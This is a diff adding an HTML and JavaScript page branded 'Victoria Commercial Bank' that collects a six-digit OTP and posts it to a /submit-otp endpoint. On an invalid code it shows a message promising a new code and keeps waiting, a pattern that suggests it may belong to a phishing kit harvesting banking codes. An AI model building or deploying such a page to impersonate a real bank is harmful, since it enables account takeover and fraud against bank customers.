@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Victoria Commercial Bank OTP</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: url('/images/background.jpg') no-repeat center center fixed;
+            background-size: cover;
+        }
+        .overlay {
+            position: absolute;
+            top: 25%;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 85, 164, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .otp-form {
+            text-align: center;
+            background: white;
+            padding: 20px;
+            border-radius: 5px;
+            width: 300px;
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        input::placeholder {
+            font-style: italic;
+        }
+        .continue-btn {
+            background-color: #ffd700;
+            color: #0055a4;
+            border: none;
+            padding: 10px 20px;
+            margin-top: 20px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        .error-message {
+            background-color: #f44336;
+            color: white;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 4px;
+            display: none;
+            text-align: left;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo">VICTORIA COMMERCIAL BANK</div>
+    <div class="overlay">
+        <div class="otp-form">
+            <h2>Enter OTP</h2>
+            <form id="otpForm">
+                <input type="text" id="otpInput" placeholder="6 digit code" maxlength="6" pattern="\d*" inputmode="numeric" required>
+                <button type="submit" class="continue-btn">Continue</button>
+            </form>
+            <div class="error-message" id="errorMessage">
+                The OTP you entered is incorrect. You will receive a new code shortly.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const otpForm = document.getElementById('otpForm');
+        const otpInput = document.getElementById('otpInput');
+        const errorMessage = document.getElementById('errorMessage');
+
+        otpForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const userId = sessionStorage.getItem('userId');
+            const otp = otpInput.value;
+            if (otp.length === 6) {
+                fetch('/submit-otp', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ userId, otp }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.valid) {
+                        errorMessage.style.display = 'block';
+                        setTimeout(() => {
+                            errorMessage.style.display = 'none';
+                            otpInput.value = '';
+                        }, 3000);
+                    }
+                })
+                .catch(error => console.error('Error:', error));
+            }
+        });
+
+        otpInput.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+    </script>
+</body>
+</html>
